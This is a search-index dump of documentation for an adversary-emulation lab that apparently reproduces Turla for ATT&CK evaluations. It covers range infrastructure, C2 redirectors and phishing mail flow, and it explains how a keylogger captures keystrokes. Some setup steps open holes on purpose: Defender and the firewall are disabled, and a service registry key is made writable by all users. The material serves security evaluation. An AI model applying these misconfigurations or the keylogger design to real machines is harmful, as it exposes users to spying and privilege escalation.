source","Name","random_id.id-random","resource","Type"]},{"l":"Inputs","p":["[\"176.59.15.33\",\"176.59.15.44\"]","[\"91.52.201.144\",\"91.52.201.202\"]","[\"91.52.201.31\",\"91.52.201.98\",\"91.52.201.119\"]","[\"91.52.62.64\",\"91.52.62.137\",\"91.52.62.203\"]","10.100.0.0/16","10.100.30.0/24","10.100.30.202","10.100.30.203","10.100.30.204","10.100.40.0/24","10.100.40.102","10.100.40.103","10.20.0.0/16","10.20.10.0/24","10.20.10.17","10.20.10.23","10.20.10.9","10.20.20.0/24","10.20.20.102","10.20.20.103","10.20.20.104","10.20.50.0/24","10.20.60.0/24","176.59.0.0/16","176.59.15.0/24","176.59.15.13","176.59.15.55","17763.3406.220909","18362.1256.2012032308","19044.2006.220909","19h1-pro-gensecond","2019-datacenter","2019.0.20190410","91.52.0.0/16","91.52.201.0/24","91.52.201.21","91.52.201.22","91.52.201.29","91.52.62.0/24","Additional address range for vnet1","azuolas","Azure location/region for resources","bannik","berlios","berzas","brieftragerin","carbon_desk_1_hostname","carbon_desk_1_ip","carbon_desk_2_hostname","carbon_desk_2_ip","carbon_desk_3_hostname","carbon_desk_3_ip","carbon_srv_ad_hostname","carbon_srv_ad_ip","carbon_srv_ex_hostname","carbon_srv_ex_ip","carbon_srv_web_hostname","carbon_srv_web_ip","carbon_support_c2_ip_list","carbon_win_ad_srv_os_azure_source_image_sku","carbon_win_ad_srv_os_azure_source_image_version","carbon_win_desk_os_azure_source_image_sku","carbon_win_desk_os_azure_source_image_version","carbon_win_srv_os_azure_source_image_sku","carbon_win_srv_os_azure_source_image_version","clymer","Default","Description","Detlab hostname","detlab_srv_hostname","detlab_srv_ip","dev_linux_password","dev_linux_username","dev_win_admin_password","dev_win_admin_username","devadmin","Domain name for AD","Domain name for Carbon","Domain name for Snake","domovoy","drebule","hobgoblin","IP range of subnet (must be within vnet 2 address space)","IP range of subnet 1 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 2 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 3 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 4 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 5 on vnet 1 (must be within vnet 1 address space)","IP range of subnet on vnet 3 (must be within vnet 3 address space)","IPs to be assigned to C2","kagarov","khabibulin","kontos","list(string)","location","modin","n/a","Name","name-prefix","Netbios name for AD","Netbios name for Carbon","Netbios name for Snake","nk","nk.local","no","Password for dev Linux hosts","Password for Windows 10 desktop dev boxes","Path to SSH private key to use for Linux ssh systems (public and private key must be matching pair)","Path to SSH public key to use for Linux ssh systems (public and private key must be matching pair)","red_jumpbox_hostname","red_jumpbox_ip","red_kali_platform_hostname","red_kali_platform_ip_list","red_postfix_hostname","red_web_hostname","Required","richards","skt","skt.local","Sku for Windows Server to use (Carbon AD server only)","Sku for Windows Server to use (Carbon)","Sku for Windows Server to use (snake)","snake_desk_1_hostname","snake_desk_1_ip","snake_desk_2_hostname","snake_desk_2_ip","snake_srv_ad_hostname","snake_srv_ad_ip","snake_srv_ex_hostname","snake_srv_ex_ip","snake_srv_file_hostname","snake_srv_file_ip","snake_support_c2_ip_list","snake_support_c2_ip_list_2","snake_win_desk_os_azure_source_image_sku","snake_win_desk_os_azure_source_image_version","snake_win_srv_os_azure_source_image_sku","snake_win_srv_os_azure_source_image_version","ssh_private_key_path","ssh_public_key_path","stelio","stlouis","string","String prefix for resource names","support_dns_hostname","support_dns_ip","support_postfix_ip","support_web_ip","Type","uosis","Username for Linux hosts","Username for Windows 10 desktop dev boxes","Version for Windows Server to use (Carbon AD server only)","Version for Windows Server to use (Carbon)","Version for Windows Server to use (snake)","vnet 1 address space","vnet 2 address space","vnet 3 address space","vnet1-address-space","vnet1-address-space-2","vnet1-sub1-range","vnet1-sub2-range","vnet1-sub3-range","vnet1-sub4-range","vnet1-sub5-range","vnet1-sub6-range","vnet2-address-space","vnet2-sub1-range","vnet3-address-space","vnet3-sub1-range","vnet3-sub2-range","win_carbon_domain_name","win_carbon_netbios_name","win_domain_name","win_netbios_name","win_snake_domain_name","win_snake_netbios_name","win_srv_admin_password","win_srv_admin_username","win10-21h2-pro-g2","Windows server admin password","Windows Server admin username","yes"]},{"l":"Outputs","p":["No outputs."]}],[{"l":"Carbon Victim LAN Setup","p":["Domain Controller - Bannik","Desktop - Hobgoblin","Desktop - Domovoy","Desktop - Khabibulin","Exchange - Brieftragerin","Web Server - Kagarov","Script order and dependencies"]},{"i":"domain-controller---bannik","l":"Domain Controller - Bannik","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","bannik-create-carbon-domain.ps1","Creates the Carbon scenario Active Directory domain (âskt.localâ)","bannik-create-carbon-users.ps1","Creates domain users and domain groups for Carbon scenario","bannik-set-dns-resolution.ps1","Set primary and secondary DNS on endpoints to the DC","bannik-set-adalwolfa-group-membership.ps1","Add Kagarov to Webservers group"]},{"i":"desktop---hobgoblin","l":"Desktop - Hobgoblin","p":["all-carbon-enable-remote-desktop-for-domain-users.ps1","all-join-carbon-domain.ps1","choco-install-packages.ps1","chocolatey-install.ps1","Copy the windows-service/dist/ViperVPN.exe file to Hobgoblin","Enable remote desktop access for Domain Users","Execute the following command from the Command Prompt.","Install SetACL Studio on Hobgoblin (see WindowsService for download link)","Installs Chocolatey Package Manager","Installs sysinternals, vscode, and microsoft-edge","Join the Carbon domain","Modify the ACL on the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ViperVPNSvc to grant full control to Authenticated Users.","Open Adminstrator Command Prompt on Hobgoblin","Script","Summary","The Hobgoblin host also runs the ViperVPN Windows service used in the scenario. After running the setup, perform the following steps:","ViperVPN.exe --startup delayed install"]},{"i":"desktop---domovoy","l":"Desktop - Domovoy","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-carbon-domain.ps1","Join the Carbon domain","all-carbon-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users"]},{"i":"desktop---khabibulin","l":"Desktop - Khabibulin","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-carbon-domain.ps1","Join the Carbon domain","all-carbon-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users","khabibulin-set-local-admin.ps1","Set Adalwolfa as Local Administrator on khabibulin"]},{"i":"exchange---brieftragerin","l":"Exchange - Brieftragerin","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-carbon-domain.ps1","Join the Carbon domain","all-carbon-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users","brieftragerin-install-exchange.ps1","Install Exchange","brieftragerin-create-carbon-exchange-admin.ps1","Create Exchange administrator"]},{"i":"web-server---kagarov","l":"Web Server - Kagarov","p":["Script","Summary","kagarov-setup.sh","Installs dependencies for Kagarov and configures DNS","kagarov-join-domain.sh","Joins Kagarov host to domain"]},{"l":"Script order and dependencies","p":["Run chocolatey-install.ps1 on all victim machines.","Run choco-install-packages.ps1 on all victim machines.","Run bannik-create-carbon-domain.ps1 script on bannik.","Run bannik-create-carbon-users.ps1 script on bannik.","Run all-join-carbon-domain.ps1 script on all respective Windows endpoints that should be joined to the domain.","Run all-carbon-enable-remote-desktop-for-domain-users.ps1 on all Desktop endpoints to enable remote desktop access for Domain Users.","Run kagarov-setup.sh and kagarov-join-domain.sh on kagarov, as user with effective root permissions.","Run the brieftragerin-install-exchange.ps1 on brieftragrein, make sure that the server was properly joined to the domain in the previous step.","Run brieftragerin-create-carbon-exchange-admin.ps1 on brieftragrein","Run khabibulin-set-local-admin.ps1 on khabibulin","Run bannik-add-computer-descriptions.ps1 on bannik","Run bannik-set-adalwolfa-group-membership.ps1 on bannik","Run bannik-set-dns-resolution.ps1 on bannik","Disable Defender on all Windows machines (requires manual setup)","Open MS Defender Settings -> Virus Protection and manually uncheck everything and save."]}],[{"l":"DNS Configuration","p":["Unbound DNS, by NLnet Labs, was used to provide DNS services for the range. The configuration is available in the resources/dns folder.","Run the install-unbound-dns.sh script on stlouis.","Copy the resources/dns/*.conf files to stlouis host to /etc/unbound/unbound.conf.d/","Restart the unbound service, sudo systemctl restart unbound."]}],[{"l":"Getting Started","p":["This document covers the infrastructure setup for emulating Turla in Round 5 of ATT&CK Evaluations Enterprise.","Prerequisites","Terraform","Detections vs Protections","Setup Guides","Support - Setup First","Carbon","Snake","Red Team"]},{"l":"Prerequisites","p":["It is assumed you have a working knowledge of the following concepts and access to related tools:","Terraform,","PowerShell,","Linux Shell Scripting (e.g. bash),","Existing Microsoft Azure with permissions to perform required actions (create manage resources including VM instances, VNETs, Virtual Network Gateways, and related resources),","Azure CLI,","Concepts such as DNS, Email,","PKI,","and common system administration concepts for Windows and Linux"]},{"l":"Terraform","p":["cp -a deploy.auto.tfvars.template deploy.auto.tfvars","Create a Terraform settings file from the included template.","Execute the Terraform plan created in the previous step.","Initialize your Terraform environment.","NOTE: This step may take a 15-30 minutes to properly provision all resources. This is normal.","NOTE: You may be prompted to accept the Terms and subscribe for the Kali image in the Azure Marketplace. If prompted, follow the URL provided in the terminal and click the Subscribe button. Once the process completes, re-run the Terraform plan and apply commands below.","Open the deploy.auto.tfvars in an editor, and configure with desired values.","Plan your deployment with Terraform.","terraform apply tfplan","terraform init","Terraform is used to initialize the Turla infrastructure.","terraform plan --out=tfplan","terraform validate","Time to run Terraform.","Validate your Terraform configuration.","You are done, celebrate!"]},{"l":"Detections vs Protections","p":["For the Turla evaluation, the Protections evaluation was conducted on a clone of the Detections range. Therefore there is only one infrastructure configuration, there is no differernce from an Infrastructure perspective whether the environment is used for Detections or Protections, all setup is identical."]},{"l":"Setup Guides","p":["There are four components of the Turla infrastructure, each broken out below. Each guide assumes the infrastructure has already been setup with Terraform."]},{"i":"support---setup-first","l":"Support - Setup First","p":["Contains resources that support the entire range, such as DNS, mail, and traffic redirection. Should be setup first, prior to configuring other components.","See Setup Support for details."]},{"l":"Carbon","p":["Contains resources related to the Carbon scenario, also referenced as \"Scenario 1\".","See Setup Carbon for details."]},{"l":"Snake","p":["Contains resources related to the Snake scenario, also referenced as \"Scenario 2\".","See Setup Snake for details."]},{"l":"Red Team","p":["Contains resources that support Red Team activity directly.","See Setup Red Team for details."]}],[{"l":"Infrastructure for Turla Evaluation","p":["The Turla infrastructure is split over two scenarios, Scenario 1 (Carbon) and Scenario 2 (Snake). For convenience, both scenarios share supporting infrastructure, including attacker platform, DNS, mail server, and traffic forwarding hosts.","Initial infrastructure was setup using Terraform, with configuration applied via scripts and configuration files.","Infrastructure Overview","Scenario VMs","Carbon","Snake","Support Hosts","Red Team Hosts","Network Services","Network Diagram","TLS Certificates","Domains Used","Email Flow","Windows Service (Carbon Scenario Only)"]},{"l":"Infrastructure Overview","p":["This document provides an overview of the infrastructure support used for the evaluation. In addition to setup and configuration of virtual machines, this document covers infrastructure support services, such as DNS, mail, and traffic redirection, used to support the evaluation. The Carbon and Snake scenarios both shared the same set of support services for efficiency.","Any references to scenario or range hosts is referencing all Carbon and Snake hosts, unless otherwise specified."]},{"l":"Scenario VMs"},{"l":"Carbon","p":["10.20.10.17","10.20.10.23","10.20.10.9","10.20.20.102","10.20.20.103","10.20.20.104","Active Directory Domain Controller","bannik","brieftragerin","domovoy","hobgoblin","Hostname","IP","kagarov","khabibulin","Microsoft Exchange Server","OS","Role","The Carbon scenario consists of six virtual machines, all joined to the skt.local Windows domain.","Ubuntu 20.04.4 LTS - Kernel: 5.15.0-1031-azure","Ubuntu Linux Workstation","Windows 10 Pro - 10.0.19041.1806","Windows Server 2019 Datacenter - 10.0.17763.2867","Windows Server 2019 Datacenter - 10.0.17763.404","Windows Workstation"]},{"l":"Snake","p":["10.100.30.202","10.100.30.203","10.100.30.204","10.100.40.102","10.100.40.103","Active Directory Domain Controller","azuolas","berlios","berzas","drebule","Exchange Server","File Server","Hostname","IP","OS","Role","The Snake scenario consists of five virtual machines, all joined to the nk.local Windows domain.","uosis","Windows 10 Pro - 10.0.18362.1171","Windows Server 2019 Datacenter - 10.0.17763.2867","Windows Workstation"]},{"l":"Support Hosts","p":["91.52.201.21","91.52.201.22","91.52.201.29","amalie","bolt","DNS Server","eth0: 91.52.201.144, eth1: 91.52.201.202","eth0: 91.52.201.31, eth1: 91.52.201.98, eth2: 91.52.201.119","eth0: 91.52.62.64, eth1: 91.52.62.137, eth2: 91.52.62.203","Hostname","IP(s)","nato-int.com","OS","Postfix Mail Server","Role","stamp.innovationmail.net","stlouis.notfastdns.com","thunderbug","Traffic Redirector","Ubuntu 20.04","Web Server"]},{"l":"Red Team Hosts","p":["Hostname","OS","Role","IP(s)","modin","Kali Linux","Attack Platform","eth0: 176.59.15.33, eth1: 176.59.15.44","stelio","Windows Server 2019","Attacker Jumpbox","176.59.15.13"]},{"l":"Network Services","p":["In addition to the VMs in scope for vendor security software during the evaluation, additional hosts were required to provide the full complement of services to fully emulate the scenario."]},{"l":"Network Diagram","p":["The diagram below shows the layout of both scenario networks, attack platform, and support hosts."]},{"l":"TLS Certificates","p":["A self-signed certificate authority was generated to emulate a legitimately assigned TLS certificate for the domain svobodaukrayin[.]ua. See the Certificate Authority page for further details on how the certificates were created and configured."]},{"l":"Domains Used","p":["URL","Usage","Notes","svobodaukrayin[.]ua, <www.svobodaukrayin[.]ua>","Web Certificate","Emulated registered domain with valid TLS certificate"]},{"l":"Email Flow","p":["Email services used Microsoft Exchange 2019 for email processing for each scenario domain, with Postfix used as the external email server. More details are provided in the Email Flow page."]},{"i":"windows-service-carbon-scenario-only","l":"Windows Service (Carbon Scenario Only)","p":["The Carbon Windows VMs had a custom Windows Service installed, Viper VPN Service. Details of the service code and configuration are provided in the linked document."]}],[{"l":"Mail Flow","p":["Overview","Email Flow","Email - Inbound To Scenario Exchange Servers","Email - Outbound From Scenario Exchange Servers","Mail Flow Diagram"]},{"l":"Overview","p":["Mail Exchange DNS records (MX) are used to determine email routing for both inbound and outbound email. When the terms Inbound and Outbound are used in this document, Inbound and Outbound are always relative the the Exchange Servers perspective.","Postfix was used as the mail server external to the vendor range."]},{"l":"Email Flow"},{"i":"email---inbound-to-scenario-exchange-servers","l":"Email - Inbound To Scenario Exchange Servers","p":["Postfix was used to provide email services external to the scenario domains. From the attacker platform, email was masked to rewrite emails originating from the attacker platform to a different domain name, to further obscure the attacking platform."]},{"i":"email---outbound-from-scenario-exchange-servers","l":"Email - Outbound From Scenario Exchange Servers","p":["When sending email from Exchange, Exchange used DNS lookups to identify mail servers to send email. For the evaluation, all email sent to *@innovationmail.net(for all users) was always forwarded to cradwell@notslowmail.com. The cradwell@notslowmail.com inbox was processed using Procmail scripts, to extract all attachments from emails to a separate directory."]},{"l":"Mail Flow Diagram"}],[{"l":"Red Team Setup","p":["Red LAN","Red LAN Systems to Configure","Attack Platform - Modin","Jumpbox - Stelio"]},{"l":"Red LAN"},{"l":"Red LAN Systems to Configure"},{"i":"attack-platform---modin","l":"Attack Platform - Modin","p":["chown -R cradwell:cradwell /home/cradwell/.procmailrc /home/cradwell/mail","Configuration","Enable and start postfix, run:","Ensure Apache and Mariadb are enabled","Follow instructions to setup watering_hole","Install","Install files/support/kali/kali-home-cradwell-procmailrc to /home/cradwell/.procmailrc","Install files/support/kali/kali-postfix-conf to /etc/postfix/main.cf","mkdir -p /home/cradwell/mail","Run files/support/kali/kali-install-custom-certs.sh","Run files/support/kali/kali-prereqs.sh","Run files/support/kali/kali-send-email.sh","Run files/support/kali/kali-set-nato-int-redirect.sh","Run files/support/kali/kali-update-wp.sh","Run files/support/kali/kali-update.sh","Set proper file ownership on .procmailrc file, and make mail directories, run:","systemctl enable --now apache2","systemctl enable --now mysql","systemctl enable --now postfix"]},{"i":"jumpbox---stelio","l":"Jumpbox - Stelio","p":["The Windows Jumpbox requires minimal configuration.","Configuration","Run files/common/chocolatey-install.ps1","Run files/common/choco-install-packages.ps1","Run files/common/disable-firewall.ps1","Run files/common/configure-jumpbox.ps1"]}],[{"l":"Self Signed Certificate Authority","p":["Summary","Example Certificate Authority Creation","Create Host Certificate","Install on Snake Windows Domain","Update on Kali box","Install custom certificate on Kali box","Setup nato-int[.]com redirect","Update Wordpress installation","Send Carbon Scenario Email"]},{"l":"Summary","p":["CloudFlare's CFSSL project was used to generate a certificate authority, intermediate certificate, and host certificate for the scenario, to emulate a valid issued TLS certificate."]},{"l":"Example Certificate Authority Creation","p":["The following provides an example of how to generate the CA, intermediate CA, and host certificate using CFSSL. A full explanation of CFSSL can be found on the project GitHub page.","Update ca.json, intermediate-ca.json, and host1.json as appropriate to reflect the new certificate authority, certificate authority intermediate certificate, and host certificate for web host.","The cfssl.json provided has the needed roles predefined, but may need to be modified based on your particular needs.","Run the following commands to generate the CA certificate, and intermediate issuing certificate:"]},{"l":"Create Host Certificate","p":["Run the following command:","Jobs done."]},{"l":"Install on Snake Windows Domain","p":["Use Group Policy to deploy trusted certificate on domain.","Connect to Snake Active Directory controller ( berlios)","Follow directions from Microsoft to trust certificate authority and intermediate certificate on domain.","Deploy updated group policy to nk domain."]},{"l":"Update on Kali box"},{"l":"Install custom certificate on Kali box","p":["From Kali, run kali-install-custom-certs.sh"]},{"i":"setup-nato-intcom-redirect","l":"Setup nato-int[.]com redirect","p":["From Kali, run kali-set-nato-int-redirect.sh"]},{"l":"Update Wordpress installation","p":["From Kali, run kali-update-wp.sh"]},{"l":"Send Carbon Scenario Email","p":["From Kali, run kali-send-email.sh"]}],[{"l":"Snake Victim LAN Setup","p":["Domain Controller - Berlios","Desktop - Uosis","Desktop - Azuolas","Exchange - Drebule","File Server - Berzas","Script order and dependencies"]},{"i":"domain-controller---berlios","l":"Domain Controller - Berlios","p":["berlios-create-fileserver-admin.ps1","berlios-create-snake-domain.ps1","berlios-create-snake-users.ps1","berlios-set-computer-descriptions.ps1","berlios-set-dns-resolution.ps1","choco-install-packages.ps1","chocolatey-install.ps1","Creates domain users and domain groups for Snake scenario","Creates necessary File Server Admin group","Creates the Snake scenario Active Directory domain (ânk.localâ)","Installs Chocolatey Package Manager","Installs sysinternals, vscode, and microsoft-edge","Script","Set primary and secondary DNS on endpoints to the DC","Sets the names and descriptions of endpoints joined to Snake scenario domain","Summary"]},{"i":"desktop---uosis","l":"Desktop - Uosis","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-snake-domain.ps1","Join the Snake domain","all-snake-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users"]},{"i":"desktop---azuolas","l":"Desktop - Azuolas","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-snake-domain.ps1","Join the Snake domain","all-snake-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users","azuolas-enable-fileserver-admin.ps1","Enable File Server Admin permissions as Local Administrator"]},{"i":"exchange---drebule","l":"Exchange - Drebule","p":["all-join-snake-domain.ps1","choco-install-packages.ps1","chocolatey-install.ps1","Create Exchange administrator","Disable WMIC integrity check","drebule-create-snake-exchange-admin.ps1","drebule-disable-wmic-integrity-check.ps1","drebule-enable-remote-desktop-for-exchange-admin.ps1","drebule-install-exchange.ps1","Enable remote desktop access for Exchange administrator","Install Exchange","Installs Chocolatey Package Manager","Installs sysinternals, vscode, and microsoft-edge","Join the Snake domain","Script","Summary"]},{"i":"file-server---berzas","l":"File Server - Berzas","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-snake-domain.ps1","Join the Snake domain","berzas-enable-remotedesktop-for-snake-fileserver.ps1","Enable remote desktop access for File Server admin","berzas-install-admodule.ps1","Install AD Powershell module","berzas-set-local-admin.ps1","Configure File Server Admin as local administrator"]},{"l":"Script order and dependencies","p":["Disable Defender on all Windows machines (requires manual setup).","Open MS Defender Settings -> Virus Protection and manually uncheck everything and save.","Run all-join-snake-domain.ps1 scripts on all respective Windows endpoints that should be joined to the domain.","Run azuolas-enable-fileserver-admin.ps1 on azuolas.","Run berlios-create-fileserver-admin.ps1 on berlios.","Run berlios-create-snake-domain.ps1 scripts on berlios.","Run berlios-create-snake-users.ps1 scripts on berlios.","Run berlios-set-computer-descriptions.ps1 on berlios.","Run berlios-set-dns-resolution.ps1 on all endpoints.","Run berzas-enable-remotedesktop-for-snake-fileserver.ps1 on berzas.","Run berzas-install-admodule.ps1 script on berzas.","Run berzas-set-local-admin.ps1 on berzas.","Run choco-install-packages.ps1 on all victim machines.","Run chocolatey-install.ps1 on all victim machines.","Run drebule-create-snake-exchange-admin.ps1 on drebule.","Run drebule-enable-remote-desktop-for-exchange-admin.ps1 on drebule.","Run drebule-install-exchange.ps1 on drebule, make sure that the server was properly joined to the domain in previous step."]}],[{"l":"Support LAN","p":["Support LAN Systems to Configure","Redirectors","DNS","Mail","Web Server","Traffic Redirectors"]},{"l":"Support LAN Systems to Configure"},{"l":"Redirectors","p":["Amalie - Redirector","enable-traffic-forwarding-rules-amalie.sh - Set up the traffic forwarding rules for amalie redirector","Thunderbug - Redirector","enable-traffic-forwarding-rules-thunderbug.sh - Set up the traffic forwarding rules for thunderbug redirector","Bolt - Redirector","enable-traffic-forwarding-rules-bolt.sh - Set up the traffic forwarding rules for bolt redirector"]},{"l":"DNS","p":["stlouis DNS server supports DNS for the range.","Install","install-unbound-dns.sh- Installs the Unbound DNS package on stlouis DNS server.","Configuration","Install all files/support/dns/*.conf files to the /etc/unbound/unbound.conf.d/ directory."]},{"l":"Mail","p":["The stamp server runs Postfix for the range. See Email Flow for more details on how mail is routed.","Install","As root, run the following commands to install Postfix and configure DNS:","DEBIAN_FRONTEND=noninteractive apt install -y postfix ripmime mailutils procmail","Run files/support/mail/stamp-configure-dns.sh to configure DNS.","Configuration","Install files/support/mail/etc_mailname to /etc/mailname","Install files/support/mail/etc_postfix_main.cf to /etc/postfix/main.cf","Install files/support/mail/etc_postfix_virtual.cf to /etc/postfix/virtual.cf","Run postmap /etc/postfix/virtual to build the virtual domain aliases.","Run systemctl enable --now postfix systemctl restart postfix to apply the new configuration."]},{"l":"Web Server","p":["nato-int.com - Web Server","Install","As root, run the following commands:","apt update apt install -y git etckeeper apache2 wget","hostnamectl set-hostname nato-int.com","systemctl enable --now apache2"]},{"l":"Traffic Redirectors","p":["All Redirectors as root","apt update apt install -y netfilter-persistent","chmod +x /opt/*.sh","Configuration","Control","Copy the following files to every redirector (destination doesn't matter, /opt/ used for examples)","Copy the matching enable-traffic-forwarding-HOSTNAME.sh script to each redirector (e.g. enable-traffic-forwarding-amalie.sh to amalie)","Disable forwarding","files/support/redirectors/disable-traffic-forwarding-rules.sh","files/support/redirectors/print-traffic-forwarding-rules.sh","Install","Make scripts executable","Run /opt/disable-traffic-forwarding-rules.sh to disable forwarding.","Run /opt/enable-traffic-forwarding-HOSTNAME.sh on each host","Run /opt/print-traffic-forwarding-rules.sh view the current forwarding configuration","View configuration"]}],[{"l":"Traffic Redirectors","p":["Evaluations occurred in Microsoft Azure, which limits the number of network interfaces that can be attached to VM. Three redirectors were required to support traffic redirection for eight IP addresses.","Traffic redirection is performed using iptables NAT masquerading, with traffic sent to specific destination ports on a particular network interface being redirected to a specific IP address and port. Scripts in the setup/ folder provide the following functionality:","enable-traffic-forwarding-rules-HOSTNAME.sh","Running the script on a server will configures network forwarding rules. Note that forwarding rules are based on network interfaces. As multiple IP addresses are attached to redirector VMs, double check the network interfaces are assigned to the expected IP addresses.","disable-traffic-forwarding-rules.sh","Running the script on a server will disable and clear any network forwarding rules in place.","print-traffic-forwarding-rules.sh","Running the script will print to stdout any network forwarding rules currently configured."]},{"l":"Table of URLs and IPs used by Redirectors","p":["91.52.201.119","91.52.201.144","91.52.201.202","91.52.201.31","91.52.201.98","91.52.62.137","91.52.62.203","91.52.62.64","amalie, eth0","amalie, eth1","amalie, eth2","anto-int[.]com","bestcafeswimxp2[.]com","bolt, eth0","bolt, eth1","cheapinfomedical99[.]net","eunewswire[.]eu","gamesiteworldwide2023[.]org","IP","prendre-des-vacances[.]fr","Redirector Host","shoppingbeach[.]org","svobodaukrayin[.]ua","thunderbug, eth0","thunderbug, eth1","thunderbug, eth2","URL"]}],[{"l":"Windows Service"},{"l":"Overview","p":["A custom Windows service was created for the evaluation, Viper VPN Service. The Windows service was a dummy service, using pywin32 and pyinstaller. The source code and build instructions for the Windows service are in the windows-service directory."]},{"l":"Build Instructions","p":["The build must be performed on a Windows host.","NOTE: The following steps assume you have installed Python on your Windows host, and the Python executables are on your system PATH."]},{"l":"Build","p":["Create a Python virtual environment, we will use the name venv for the virtual environment, python -m venv venv.","Activate virtualenv.","venv/Scripts/activate","Use pip to install dependencies.","python -m pip install pywin32 pyinstaller","Run pywin32 post installer script.","python venv/Scripts/pywin32_postinstall.py -install","Deactivate virtualenv.","deactivate","Reactivate virtualenv.","Run build.","Change directory to files/windows-service.","Execute build, pyinstaller.exe --onefile --runtime-tmpdir=. --hidden-import win32timezone viperVpn.py","Binary executable will be output in files/windows-service/dist/ directory.","Use the new executable to continue with Carbon Setup"]},{"l":"SetACL Studio","p":["After the ViperVPNSvc service was installed on the hosts, the service registry key access control was modified.","SetACL Studio was used to configure service permissions, to configure the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ViperVPNSvc was modified to grant full control to Authenticated Users."]}],[{"l":"Cleanup"},{"l":"Carbon Scenario"},{"l":"Setup","p":["To remove artifacts, run the Cleanup Scripts as from the Kali hosts. You can also run the cleanup scripts on each target as described in their respective directories.","From the Kali Linux machine ( 176.59.15.33):","From the RDP session, open powershell in administrative mode","Run the cleanup commands for each implant listed below that you need to cleanup","Sign out of the RDP session when finished."]},{"l":"EPIC"},{"l":"Carbon"},{"l":"Penquin","p":["Additional documentation here.","From the Kali Linux machine, SCP the Penquin cleanup script to KAGAROV:","Enter Password2! when prompted:","Execute the cleanup script, entering Password2! when prompted:"]},{"l":"Snake Scenario"},{"i":"setup-1","l":"Setup","p":["To remove artifacts, run the Cleanup Scripts as from the Kali hosts. You can also run the cleanup scripts on each target as described in their respective directories.","From the Kali Linux machine ( 176.59.15.33):","From the RDP session, open powershell in administrative mode and set the execution policy","Run the cleanup commands for each implant listed below that you need to cleanup","Reset the execution policy","Sign out of the RDP session when finished."]},{"i":"epic-1","l":"EPIC"},{"l":"Snake"},{"l":"LightNeuron"}],[{"l":"Keylogger"},{"l":"Overview","p":["Access its own process token and duplicate it to create a new primary token","Adjust the duplicated token session ID to match the active session ID","Also note that key combinations (e.g. shift+A, ctrl+c) are not converted into the end result (e.g. special characters or capital letters). It is up to the user to determine what the end result is based on which keys were pressed or released.","Alt","At a technical level, the keylogger will do the following:","Create a new keylogger process using the new token, and then terminate the current process","Ctrl","if started with the -r option, the keylogger will restart itself in the current active session in order to log keystrokes correctly.","keystrokes and other session information are logged to %temp%\\~DFA512.tmp(when running as SYSTEM, this will typically resolve to C:\\Windows\\Temp)","Query sessions until an active one is found, and grab the session ID","register a control handler to catch certain events like ctrl+c for termination in order to log them correctly","set a low-level keyboard hook procedure that will log keystrokes","Shift","start a background thread that keeps track of the current active window. If the current active window changes, the window title and associated process path are logged","The Keylogger is written in C++ and compiles into a single executable file that can be used to capture keystrokes on the target system. The Keylogger is meant to be run as SYSTEM from the Carbon DLL implant as part of the Turla emulation plan.","The keystrokes are logged in the following format: Key Pressed: KEY_NAME for key presses, and Key Released: KEY_NAME for key releases. Note that while all key presses are tracked, key releases are only tracked for the following keys to reduce logging verbosity:","This is needed when running from Carbon DLL because Carbon is kicked off as a SYSTEM service, meaning the keylogger process will not initially be in the same session as the active logged on user. As a result, it won't be able to track foreground windows and keystrokes properly.","This keylogger will perform the following:","Windows key"]},{"l":"Usage","p":["To run the keylogger within an active session, you can execute it as a normal file within a command prompt, and it will kick off the keyboard hook resulting keystrokes. Session info and logging will be found in %temp%\\~DFA512.tmp. To terminate the keylogger, you can exit out of the command prompt window or terminate the process via ctrl+c.","To run the keylogger as part of a service or outside of the active session, use the -r switch to have it automatically restart in an active session:","To terminate, you will need to terminate any keylogger processes either via Task Manager or command prompt / PowerShell."]},{"l":"Example Keylogger Output"},{"l":"CTI Notes","p":["Keystrokes are logged to %temp%\\~DFA512.tmp(name changed from %TEMP%\\~DFD3O8.tmp in CTI)","Keystrokes are using a hook on WH_KEYBOARD_LL","WM_KEYDOWN, WM_KEYUP, and WM_SYSKEYDOWN are the intercepted procedures","When the EXE loads it creats a session header that includes the hostname","Current foreground window is checked every 100ms. Window changes are logged as [%Window Process File Path%: %Window Title%]"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]},{"l":"Compiling the Binaries"},{"l":"MINGW64","p":["Using mingw64 on Windows or Kali Linux (adjust backslashes if on Linux):","To set up mingw64 on Windows, msys2 was installed and used:- choco install msys2- Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.- Run msys2 and within the new prompt, run the following:- pacman -Syu- pacman -S --needed base-devel mingw-w64-x86_64-toolchain"]},{"l":"Visual Studio 2019","p":["On a machine with Visual Studio 2019 installed, run the following to clean and build x64 release versions of the keylogger EXE:"]}],[{"l":"LightNeuron","p":["LightNeuron is 